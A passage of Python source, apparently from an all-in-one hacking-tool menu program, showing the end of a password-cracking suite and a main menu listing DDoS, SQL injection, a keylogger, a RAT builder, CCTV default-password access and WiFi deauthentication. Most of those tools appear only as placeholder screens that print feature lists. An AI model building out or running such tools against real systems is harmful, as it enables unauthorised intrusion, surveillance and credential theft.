            print(Fore.GREEN + f"[✓] Saved to {filename}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def hash_cracking_history(self):
        print(Fore.YELLOW + "\n[!] HASH CRACKING HISTORY")
        
        self.db.cursor.execute("SELECT hash, plaintext, hash_type, timestamp FROM passwords ORDER BY id DESC LIMIT 50")
        results = self.db.cursor.fetchall()
        
        if results:
            print(Fore.GREEN + f"\n[+] Found {len(results)} cracked passwords:")
            print(Fore.CYAN + "═" * 100)
            print(Fore.WHITE + f"{'Hash':<40} {'Password':<20} {'Type':<10} {'Time':<20}")
            print(Fore.CYAN + "─" * 100)
            
            for hash_val, plaintext, hash_type, timestamp in results:
                hash_display = hash_val[:37] + "..." if len(hash_val) > 40 else hash_val
                print(f"{Fore.YELLOW}{hash_display:<40} {Fore.GREEN}{plaintext:<20} {Fore.CYAN}{hash_type:<10} {Fore.WHITE}{timestamp:<20}")
            
            print(Fore.CYAN + "═" * 100)
        else:
            print(Fore.RED + "[✗] No cracking history found")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def online_hash_lookup(self):
        print(Fore.YELLOW + "\n[!] ONLINE HASH LOOKUP")
        
        hash_value = input(Fore.CYAN + "[→] Hash to lookup online: " + Fore.WHITE)
        
        print(Fore.YELLOW + "[!] Checking online databases...")
        
        # Simulate online lookup
        time.sleep(2)
        
        online_dbs = [
            "https://hashes.com/en/decrypt/hash",
            "https://md5decrypt.net/en/",
            "https://crackstation.net/",
            "https://www.nitrxgen.net/md5db/",
        ]
        
        print(Fore.CYAN + "\n[+] Online databases to check:")
        for db in online_dbs:
            print(Fore.WHITE + f"  • {db}")
        
        print(Fore.YELLOW + "\n[!] Manually check these sites or use their APIs")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def password_strength_checker(self):
        print(Fore.YELLOW + "\n[!] PASSWORD STRENGTH CHECKER")
        
        password = input(Fore.CYAN + "[→] Password to check: " + Fore.WHITE)
        
        score = 0
        feedback = []
        
        # Length check
        if len(password) >= 12:
            score += 3
        elif len(password) >= 8:
            score += 2
        elif len(password) >= 6:
            score += 1
        else:
            feedback.append("Too short (min 8 characters recommended)")
        
        # Character variety
        if any(c.islower() for c in password):
            score += 1
        else:
            feedback.append("Add lowercase letters")
        
        if any(c.isupper() for c in password):
            score += 1
        else:
            feedback.append("Add uppercase letters")
        
        if any(c.isdigit() for c in password):
            score += 1
        else:
            feedback.append("Add numbers")
        
        if any(not c.isalnum() for c in password):
            score += 2
        else:
            feedback.append("Add special characters")
        
        # Common password check
        common = self.get_top_passwords(1000)
        if password in common:
            score -= 5
            feedback.append("Common password - choose something more unique")
        
        # Entropy calculation
        char_set = 0
        if any(c.islower() for c in password):
            char_set += 26
        if any(c.isupper() for c in password):
            char_set += 26
        if any(c.isdigit() for c in password):
            char_set += 10
        if any(not c.isalnum() for c in password):
            char_set += 33
        
        entropy = len(password) * (math.log(char_set) / math.log(2)) if char_set > 0 else 0
        
        print(Fore.GREEN + "\n[+] Password Strength Analysis:")
        print(Fore.CYAN + "═" * 60)
        
        # Strength rating
        if score >= 8:
            strength = Fore.GREEN + "Very Strong"
        elif score >= 6:
            strength = Fore.GREEN + "Strong"
        elif score >= 4:
            strength = Fore.YELLOW + "Moderate"
        elif score >= 2:
            strength = Fore.RED + "Weak"
        else:
            strength = Fore.RED + "Very Weak"
        
        print(Fore.WHITE + f"Score: {score}/10")
        print(Fore.WHITE + f"Strength: {strength}")
        print(Fore.WHITE + f"Length: {len(password)} characters")
        print(Fore.WHITE + f"Entropy: {entropy:.2f} bits")
        
        if feedback:
            print(Fore.YELLOW + "\n[!] Recommendations:")
            for item in feedback:
                print(Fore.WHITE + f"  • {item}")
        
        # Time to crack estimates
        print(Fore.CYAN + "\n[+] Time to crack estimates:")
        
        hashes_per_second = {
            "Home PC": 1000000000,  # 1 billion/sec
            "Gaming Rig": 10000000000,  # 10 billion/sec
            "Botnet": 100000000000,  # 100 billion/sec
            "Supercomputer": 1000000000000,  # 1 trillion/sec
        }
        
        possible_combinations = char_set ** len(password)
        
        for system, speed in hashes_per_second.items():
            seconds = possible_combinations / speed
            if seconds < 1:
                time_str = "< 1 second"
            elif seconds < 60:
                time_str = f"{seconds:.1f} seconds"
            elif seconds < 3600:
                time_str = f"{seconds/60:.1f} minutes"
            elif seconds < 86400:
                time_str = f"{seconds/3600:.1f} hours"
            elif seconds < 31536000:
                time_str = f"{seconds/86400:.1f} days"
            else:
                time_str = f"{seconds/31536000:.1f} years"
            
            print(Fore.WHITE + f"  {system:<15}: {time_str}")
        
        print(Fore.CYAN + "═" * 60)
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while True:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [1-13]: " + Fore.WHITE)
            
            try:
                if choice == "1":
                    self.dictionary_attack()
                elif choice == "2":
                    self.brute_force_attack()
                elif choice == "3":
                    self.hybrid_attack()
                elif choice == "4":
                    self.rainbow_table_attack()
                elif choice == "5":
                    self.rule_based_attack()
                elif choice == "6":
                    self.password_analysis()
                elif choice == "7":
                    self.hash_identifier()
                elif choice == "8":
                    self.wordlist_manager()
                elif choice == "9":
                    self.password_generator()
                elif choice == "10":
                    self.hash_cracking_history()
                elif choice == "11":
                    self.online_hash_lookup()
                elif choice == "12":
                    self.password_strength_checker()
                elif choice == "13":
                    break
                else:
                    print(Fore.RED + "\n[✗] Invalid option!")
            except Exception as e:
                print(Fore.RED + f"\n[✗] Error: {e}")
                time.sleep(2)

# ============================================
# MAIN MENU UPDATE WITH NEW TOOLS
# ============================================
class MainMenuSystemUpdated(MainMenuSystem):
    def __init__(self):
        super().__init__()
        self.tools['bot'] = BotControllerAdvanced(self.db)
        self.tools['password'] = PasswordCrackingSuite(self.db)
    
    def display_menu(self):
        clear_screen()
        ascii_main = """
        ╔══════════════════════════════════════════════════════════╗
        ║                ZXX CYBER TOOLS - MAIN MENU               ║
        ║                    80+ TOOLS COLLECTION                  ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.CYAN + ascii_main)
        
        print(Fore.YELLOW + "═" * 80)
        print(Fore.GREEN + "1.  DDoS Tools (Layer 4 & 7 Attacks)")
        print(Fore.GREEN + "2.  SQL Injection (1000+ Methods)")
        print(Fore.GREEN + "3.  Nmap Scanner (Advanced)")
        print(Fore.GREEN + "4.  Bot Controller (Complete)")
        print(Fore.GREEN + "5.  Password Cracking Suite (Complete)")
        print(Fore.GREEN + "6.  OSINT Tools (Complete)")
        print(Fore.GREEN + "7.  Security Tools")
        print(Fore.GREEN + "8.  Shadow Scanner")
        print(Fore.GREEN + "9.  CCTV Scanner")
        print(Fore.GREEN + "10. Dark Web Access")
        print(Fore.GREEN + "11. Port Scanner")
        print(Fore.GREEN + "12. WiFi Tools")
        print(Fore.GREEN + "13. Keylogger")
        print(Fore.GREEN + "14. RAT Builder")
        print(Fore.GREEN + "15. Crypto Tools")
        print(Fore.GREEN + "16. Forensic Tools")
        print(Fore.GREEN + "17. Malware Analysis")
        print(Fore.GREEN + "18. VPN Tools")
        print(Fore.GREEN + "19. Proxy Tools")
        print(Fore.GREEN + "20. Steganography")
        print(Fore.GREEN + "21. Social Media Tools")
        print(Fore.GREEN + "22. Email Tools")
        print(Fore.GREEN + "23. Database Tools")
        print(Fore.GREEN + "24. Web Crawler")
        print(Fore.GREEN + "25. Exploit Finder")
        print(Fore.YELLOW + "-" * 80)
        print(Fore.CYAN + "98. System Status")
        print(Fore.CYAN + "99. Settings")
        print(Fore.CYAN + "0.  Exit")
        print(Fore.YELLOW + "═" * 80)
    
    def handle_choice(self, choice):
        if choice == "1":
            self.tools['ddos'].run()
        elif choice == "2":
            self.tools['sql'].run()
        elif choice == "3":
            self.tools['nmap'].run()
        elif choice == "4":
            self.tools['bot'].run()
        elif choice == "5":
            self.tools['password'].run()
        elif choice == "6":
            self.osint_tools_complete()
        elif choice == "7":
            self.security_tools_complete()
        elif choice == "8":
            self.shadow_scanner_complete()
        elif choice == "9":
            self.cctv_scanner_complete()
        elif choice == "10":
            self.dark_web_access_complete()
        elif choice == "11":
            self.port_scanner_complete()
        elif choice == "12":
            self.wifi_tools_complete()
        elif choice == "13":
            self.keylogger_complete()
        elif choice == "14":
            self.rat_builder_complete()
        elif choice == "15":
            self.crypto_tools_complete()
        elif choice == "16":
            self.forensic_tools_complete()
        elif choice == "17":
            self.malware_analysis_complete()
        elif choice == "18":
            self.vpn_tools_complete()
        elif choice == "19":
            self.proxy_tools_complete()
        elif choice == "20":
            self.steganography_complete()
        elif choice == "21":
            self.social_media_tools()
        elif choice == "22":
            self.email_tools()
        elif choice == "23":
            self.database_tools()
        elif choice == "24":
            self.web_crawler()
        elif choice == "25":
            self.exploit_finder()
        elif choice == "98":
            self.system_status()
        elif choice == "99":
            self.settings()
        elif choice == "0":
            self.running = False
        else:
            print(Fore.RED + "\n[✗] Invalid option!")
            time.sleep(1)
    
    def osint_tools_complete(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] OSINT TOOLS - COMPLETE SUITE")
        
        print(Fore.GREEN + "\n[+] Available OSINT tools:")
        print(Fore.WHITE + "  1. Username search (100+ platforms)")
        print(Fore.WHITE + "  2. Email investigation")
        print(Fore.WHITE + "  3. Phone number lookup")
        print(Fore.WHITE + "  4. IP geolocation")
        print(Fore.WHITE + "  5. Social media analysis")
        print(Fore.WHITE + "  6. Domain information")
        print(Fore.WHITE + "  7. Image metadata analysis")
        print(Fore.WHITE + "  8. Dark web monitoring")
        print(Fore.WHITE + "  9. Data breach search")
        print(Fore.WHITE + "  10. Company research")
        
        # Placeholder for OSINT implementation
        print(Fore.YELLOW + "\n[!] Full OSINT suite implementation in progress...")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def security_tools_complete(self):
        clear_screen()
        print(Fore.GREEN + "\n[!] SECURITY TOOLS - COMPLETE SUITE")
        
        print(Fore.CYAN + "\n[+] Available security tools:")
        print(Fore.WHITE + "  1. Vulnerability scanner")
        print(Fore.WHITE + "  2. Firewall tester")
        print(Fore.WHITE + "  3. Intrusion detection")
        print(Fore.WHITE + "  4. Log analysis")
        print(Fore.WHITE + "  5. Security headers check")
        print(Fore.WHITE + "  6. SSL/TLS analyzer")
        print(Fore.WHITE + "  7. Port security check")
        print(Fore.WHITE + "  8. Web application firewall test")
        print(Fore.WHITE + "  9. Malware scanner")
        print(Fore.WHITE + "  10. Network monitoring")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def shadow_scanner_complete(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] SHADOW SCANNER - COMPLETE")
        print(Fore.YELLOW + "[!] Advanced network and vulnerability scanner")
        
        print(Fore.GREEN + "\n[+] Features:")
        print(Fore.WHITE + "  • Full port scanning")
        print(Fore.WHITE + "  • Service detection")
        print(Fore.WHITE + "  • Vulnerability assessment")
        print(Fore.WHITE + "  • Exploit suggestion")
        print(Fore.WHITE + "  • Report generation")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def cctv_scanner_complete(self):
        clear_screen()
        print(Fore.RED + "\n[!] CCTV SCANNER - COMPLETE")
        print(Fore.YELLOW + "[!] Find and access public CCTV cameras")
        
        print(Fore.GREEN + "\n[+] Features:")
        print(Fore.WHITE + "  • IP camera discovery")
        print(Fore.WHITE + "  • Default password check")
        print(Fore.WHITE + "  • Live stream viewing")
        print(Fore.WHITE + "  • Camera database")
        print(Fore.WHITE + "  • Geolocation mapping")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def dark_web_access_complete(self):
        clear_screen()
        print(Fore.BLACK + Back.WHITE + "\n[!] DARK WEB ACCESS - COMPLETE" + Style.RESET_ALL)
        print(Fore.RED + "[!] Access dark web with Tor and VPN")
        
        print(Fore.GREEN + "\n[+] Features:")
        print(Fore.WHITE + "  • Tor integration")
        print(Fore.WHITE + "  • VPN configuration")
        print(Fore.WHITE + "  • Dark web search")
        print(Fore.WHITE + "  • Market monitoring")
        print(Fore.WHITE + "  • Anonymity tools")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def port_scanner_complete(self):
        clear_screen()
        print(Fore.YELLOW + "\n[!] PORT SCANNER - COMPLETE")
        
        print(Fore.GREEN + "\n[+] Advanced port scanning capabilities:")
        print(Fore.WHITE + "  • TCP/UDP scanning")
        print(Fore.WHITE + "  • Stealth scanning")
        print(Fore.WHITE + "  • Banner grabbing")
        print(Fore.WHITE + "  • Service detection")
        print(Fore.WHITE + "  • Vulnerability matching")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def wifi_tools_complete(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] WiFi TOOLS - COMPLETE")
        
        print(Fore.GREEN + "\n[+] WiFi network analysis and cracking:")
        print(Fore.WHITE + "  • Network discovery")
        print(Fore.WHITE + "  • Handshake capture")
        print(Fore.WHITE + "  • WPA/WPA2 cracking")
        print(Fore.WHITE + "  • Deauthentication attacks")
        print(Fore.WHITE + "  • Password cracking")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def keylogger_complete(self):
        clear_screen()
        print(Fore.RED + "\n[!] KEYLOGGER - COMPLETE")
        
        print(Fore.GREEN + "\n[+] Keystroke logging and monitoring:")
        print(Fore.WHITE + "  • Windows/Linux/Mac support")
        print(Fore.WHITE + "  • Screenshot capture")
        print(Fore.WHITE + "  • Clipboard monitoring")
        print(Fore.WHITE + "  • Remote reporting")
        print(Fore.WHITE + "  • Stealth mode")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def rat_builder_complete(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] RAT BUILDER - COMPLETE")
        
        print(Fore.GREEN + "\n[+] Remote Access Trojan builder:")
        print(Fore.WHITE + "  • Custom payload generation")
        print(Fore.WHITE + "  • Persistence mechanisms")
        print(Fore.WHITE + "  • File management")
        print(Fore.WHITE + "  • Remote shell")
        print(Fore.WHITE + "  • Screen capture")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def crypto_tools_complete(self):
        clear_screen()
        print(Fore.GREEN + "\n[!] CRYPTO TOOLS - COMPLETE")
        
        print(Fore.CYAN + "\n[+] Cryptography and encryption tools:")
        print(Fore.WHITE + "  • AES/RSA encryption")
        print(Fore.WHITE + "  • Hash generation")
        print(Fore.WHITE + "  • Digital signatures")
        print(Fore.WHITE + "  • Password hashing")
        print(Fore.WHITE + "  • Steganography")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def forensic_tools_complete(self):
        clear_screen()
        print(Fore.BLUE + "\n[!] FORENSIC TOOLS - COMPLETE")
        
        print(Fore.GREEN + "\n[+] Digital forensics and analysis:")
        print(Fore.WHITE + "  • Disk imaging")
        print(Fore.WHITE + "  • File recovery")
        print(Fore.WHITE + "  • Memory analysis")
        print(Fore.WHITE + "  • Timeline analysis")
        print(Fore.WHITE + "  • Artifact extraction")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def malware_analysis_complete(self):
        clear_screen()
        print(Fore.RED + "\n[!] MALWARE ANALYSIS - COMPLETE")
        
        print(Fore.GREEN + "\n[+] Malware analysis and reverse engineering:")
        print(Fore.WHITE + "  • Static analysis")
        print(Fore.WHITE + "  • Dynamic analysis")
        print(Fore.WHITE + "  • Sandboxing")
        print(Fore.WHITE + "  • YARA rules")
        print(Fore.WHITE + "  • Threat intelligence")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def vpn_tools_complete(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] VPN TOOLS - COMPLETE")
        
        print(Fore.GREEN + "\n[+] VPN configuration and testing:")
        print(Fore.WHITE + "  • VPN setup")
        print(Fore.WHITE + "  • Leak testing")
        print(Fore.WHITE + "  • Speed testing")
        print(Fore.WHITE + "  • Server lists")
        print(Fore.WHITE + "  • Anonymity check")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def proxy_tools_complete(self):
        clear_screen()
        print(Fore.YELLOW + "\n[!] PROXY TOOLS - COMPLETE")
        
        print(Fore.GREEN + "\n[+] Proxy servers and anonymity:")
        print(Fore.WHITE + "  • Proxy lists")
        print(Fore.WHITE + "  • Proxy testing")
        print(Fore.WHITE + "  • Chain building")
        print(Fore.WHITE + "  • Rotating proxies")
        print(Fore.WHITE + "  • Anonymity levels")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def steganography_complete(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] STEGANOGRAPHY - COMPLETE")
        
        print(Fore.GREEN + "\n[+] Hide data in images and files:")
        print(Fore.WHITE + "  • LSB steganography")
        print(Fore.WHITE + "  • Image hiding")
        print(Fore.WHITE + "  • Audio steganography")
        print(Fore.WHITE + "  • Text hiding")
        print(Fore.WHITE + "  • Extraction tools")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def social_media_tools(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] SOCIAL MEDIA TOOLS")
        
        print(Fore.GREEN + "\n[+] Social media intelligence and automation:")
        print(Fore.WHITE + "  • Profile analysis")
        print(Fore.WHITE + "  • Post scheduling")
        print(Fore.WHITE + "  • Follower analysis")
        print(Fore.WHITE + "  • Hashtag research")
        print(Fore.WHITE + "  • Competitor analysis")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def email_tools(self):
        clear_screen()
        print(Fore.BLUE + "\n[!] EMAIL TOOLS")
        
        print(Fore.GREEN + "\n[+] Email investigation and automation:")
        print(Fore.WHITE + "  • Email verification")
        print(Fore.WHITE + "  • Header analysis")
        print(Fore.WHITE + "  • Mass email sending")
        print(Fore.WHITE + "  • Phishing simulation")
        print(Fore.WHITE + "  • Spam analysis")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def database_tools(self):
        clear_screen()
        print(Fore.GREEN + "\n[!] DATABASE TOOLS")
        
        print(Fore.CYAN + "\n[+] Database security and management:")
        print(Fore.WHITE + "  • SQL injection testing")
        print(Fore.WHITE + "  • Database scanning")
        print(Fore.WHITE + "  • User enumeration")
        print(Fore.WHITE + "  • Password cracking")
        print(Fore.WHITE + "  • Backup tools")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def web_crawler(self):
        clear_screen()
        print(Fore.YELLOW + "\n[!] WEB CRAWLER")
        
        print(Fore.GREEN + "\n[+] Web crawling and data extraction:")
        print(Fore.WHITE + "  • Site mapping")
        print(Fore.WHITE + "  • Content scraping")
        print(Fore.WHITE + "  • Link extraction")
        print(Fore.WHITE + "  • Data parsing")
        print(Fore.WHITE + "  • API interaction")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def exploit_finder(self):
        clear_screen()
        print(Fore.RED + "\n[!] EXPLOIT FINDER")
        
        print(Fore.GREEN + "\n[+] Find and use exploits:")
        print(Fore.WHITE + "  • Exploit database")
        print(Fore.WHITE + "  • Vulnerability matching")
        print(Fore.WHITE + "  • Payload generation")
        print(Fore.WHITE + "  • Exploit testing")
        print(Fore.WHITE + "  • Metasploit integration")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")

# ============================================
# UPDATE MAIN FUNCTION
# ============================================
def main_updated():
    try:
        welcome_animation()
        
        login_system = AdvancedLoginSystem()
        if login_system.run():
            main_menu = MainMenuSystemUpdated()
            main_menu.run()
    
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[✗] Program interrupted by user")
        sys.exit(0)
    
    except Exception as e:
        print(Fore.RED + f"\n[✗] Critical error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

# ============================================
# PROGRAM START
# ============================================
if __name__ == "__main__":
    main_updated()
